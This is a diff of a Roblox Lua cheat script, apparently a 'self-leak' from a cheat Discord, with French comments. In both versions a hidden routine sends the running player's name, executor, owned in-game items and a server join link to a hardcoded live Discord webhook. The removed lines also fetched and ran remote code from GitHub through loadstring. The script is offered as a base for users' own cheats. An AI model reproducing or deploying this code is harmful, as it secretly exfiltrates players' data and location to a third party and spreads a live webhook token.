@@ -1,13 +1,17 @@
 -- discord.gg/sabscripts self-leak have fun
 
+-- Script nettoyé et restructuré
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
 task.spawn(function()
-local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1NcNBMQHFiCqQSqoGEuoq63MPGXjm4JeHetAwWgOhwPJCR_nxw45CT__t"
-    local HttpService = game:GetService("HttpService")
-    local Players = game:GetService("Players")
-    local MarketplaceService = game:GetService("MarketplaceService")
-    local UserInputService = game:GetService("UserInputService")
- 
-    local player = Players.LocalPlayer
+    local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1NcNBMQHFiCqQSqoGEuoq63MPGXjm4JeHetAwWgOhwPJCR_nxw45CT__t"
+    
     if not player then repeat task.wait() player = Players.LocalPlayer until player end
  
     local name = player.Name
@@ -22,7 +26,6 @@ local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1Nc
     local placeId = game.PlaceId
     local jobId = game.JobId
  
-    -- Counter API
     local count = "?"
     pcall(function()
         local raw = game:HttpGet("https://counterapi.dev/v1/hit/ut_84uEingUzXohesnysCU6DXuiJwNlb95Mp6ES8JYN")
@@ -30,7 +33,6 @@ local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1Nc
         if dec and dec.data then count = dec.data end
     end)
  
-    -- Scan des Brainrots
     local brainrotStats = {}
     local plots = workspace:FindFirstChild("Plots")
     if plots then
@@ -55,7 +57,6 @@ local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1Nc
     for n, c in pairs(brainrotStats) do brainrotMsg = brainrotMsg .. n .. " (x" .. c .. ")\n" end
     if brainrotMsg == "" then brainrotMsg = "Aucun Brainrot détecté." end
  
-    -- Envoi du Webhook
     local data = {
         ["content"] = "🚨 **Execution #"..count.."** 🚨\n\n"..
             "👤 **Joueur:** "..name.."\n"..
@@ -66,25 +67,19 @@ local url = "https://discord.com/api/webhooks/1496125910850736158/yedpyg_hVQz1Nc
             "⚙️ **Executor:** "..executor.."\n"..
             "⏰ **Time:** "..time.."\n\n"..
             "🧠 **Brainrots Possédés:**\n```\n"..brainrotMsg.."```\n"..
-            "🔗 **Lien Serveur:** [Clique ici pour essayer](https://www.roblox.com/games/"..placeId.."?jobId="..jobId..")\n"..
-            "💻 **Code pour rejoindre (Console F9):**\n```lua\ngame:GetService('Players').LocalPlayer:Kick('Reconnecting...')\n```"
+            "🔗 **Lien Serveur:** [Clique ici](https://www.roblox.com/games/"..placeId.."?jobId="..jobId..")"
     }
     
-    HttpService:PostAsync(url, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+    local request = (syn and syn.request) or http_request or request
+    if request then
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end
 end)
-
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/brncheats/sabcheats/main/BRNDuel.txt"))()
-    end)
-end)
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local LP = Players.LocalPlayer
-local cam = workspace.CurrentCamera
-local pg = LP:WaitForChild("PlayerGui")
 
 task.spawn(function()
 -- HERE YOUR SCRIPT DUALBOOT
